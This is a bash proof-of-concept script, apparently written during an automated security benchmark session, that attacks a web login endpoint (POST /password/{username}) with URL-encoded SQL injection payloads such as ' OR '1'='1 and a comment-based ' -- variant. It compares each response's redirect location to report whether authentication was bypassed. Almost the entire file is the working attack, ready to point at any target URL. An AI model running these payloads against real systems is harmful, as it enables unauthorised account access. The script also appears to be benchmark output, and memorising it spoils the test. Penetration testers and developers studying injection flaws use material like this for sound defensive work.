#!/bin/bash
# POC: SQL injection authentication bypass POC with proper URL encoding for special characters
# Target: ./repo
# Created: 2025-11-04T17:36:14.176Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# SQL Injection Authentication Bypass POC - Version 3
# Targets: POST /password/{username} endpoint
# Vulnerability: Unsanitized username parameter in SQL query
# Using URL encoding for special characters

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] SQL Injection Authentication Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Normal login with valid credentials (baseline)
echo "[TEST 1] Normal login baseline - valid user with correct password"
echo "Request: POST /password/test with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test" \
  -d "password=test" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"
SUCCESS_BASELINE=$HTTP_CODE
echo ""

# Test 2: Invalid user baseline (should fail)
echo "[TEST 2] Invalid user baseline - nonexistent user"
echo "Request: POST /password/nonexistentuser with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/nonexistentuser" \
  -d "password=test" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"
FAIL_BASELINE=$HTTP_CODE
echo ""

# Test 3: SQL Injection - OR 1=1 with valid user
echo "[TEST 3] SQL Injection attempt with valid user"
echo "Request: POST /password/test' OR '1'='1 with password=test"
echo "(URL encoded: test%27%20OR%20%271%27%3D%271)"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test%27%20OR%20%271%27%3D%271" \
  -d "password=test" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"

if [[ "$HTTP_CODE" == "302" ]]; then
  if [[ "$LOCATION" == *"dashboard"* ]]; then
    echo "[+] VULNERABLE: SQL injection accepted with valid user!"
  elif [[ "$LOCATION" == *"error"* ]]; then
    echo "[-] Injection rejected or failed"
  fi
fi
echo ""

# Test 4: SQL Injection - OR 1=1 with invalid user (strongest evidence)
echo "[TEST 4] SQL Injection attempt with INVALID user - STRONGEST TEST"
echo "Request: POST /password/fakeusr%27%20OR%20%271%27%3D%271 with password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/fakeusr%27%20OR%20%271%27%3D%271" \
  -d "password=test" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)
BODY=$(echo "$RESPONSE" | tail -20)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"

if [[ "$HTTP_CODE" == "302" ]] && [[ "$LOCATION" == *"dashboard"* ]]; then
  echo "[+++] CONFIRMED SQL INJECTION: Non-existent user bypassed with OR 1=1!"
  echo "[+++] This is definitive proof of SQL injection authentication bypass"
  VULN_CONFIRMED=1
elif [[ "$LOCATION" == *"User+not+found"* ]] || [[ "$LOCATION" == *"Incorrect"* ]]; then
  echo "[-] Payload rejected - injection may be sanitized"
  VULN_CONFIRMED=0
fi
echo ""

# Test 5: SQL injection with wrong password (verify password parameter matters)
echo "[TEST 5] SQL Injection with wrong password - verifies password param validation"
echo "Request: POST /password/test%27%20OR%20%271%27%3D%271 with password=wrongpass"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test%27%20OR%20%271%27%3D%271" \
  -d "password=wrongpass" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"

if [[ "$LOCATION" == *"Incorrect"* ]] || [[ "$LOCATION" == *"error"* ]]; then
  echo "[+] Password parameter is validated - shows targeted injection in WHERE clause"
fi
echo ""

# Test 6: SQL Comment injection
echo "[TEST 6] SQL Comment injection - alternative technique"
echo "Request: POST /password/test%27%20--%20 with password=anything"
RESPONSE=$(curl -s -X POST "$TARGET_URL/password/test%27%20--%20" \
  -d "password=anything" \
  -i 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | grep "^HTTP" | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep "^Location:" | cut -d' ' -f2)

echo "HTTP Status: $HTTP_CODE"
echo "Redirect Location: $LOCATION"

if [[ "$HTTP_CODE" == "302" ]] && [[ "$LOCATION" == *"dashboard"* ]]; then
  echo "[+] VULNERABLE: Comment injection allowed arbitrary password bypass!"
fi
echo ""

# Summary
echo "========================================"
echo "[*] VULNERABILITY ASSESSMENT SUMMARY"
echo "========================================"

if [[ $VULN_CONFIRMED -eq 1 ]]; then
  echo "[+++] SQL INJECTION CONFIRMED"
  echo "[+++] Non-existent user + SQL injection payload succeeded"
  echo "[+++] This bypasses the username authentication check"
else
  echo "[-] SQL injection may not be exploitable on this target"
  echo "[-] Verify endpoint URL and payload encoding"
fi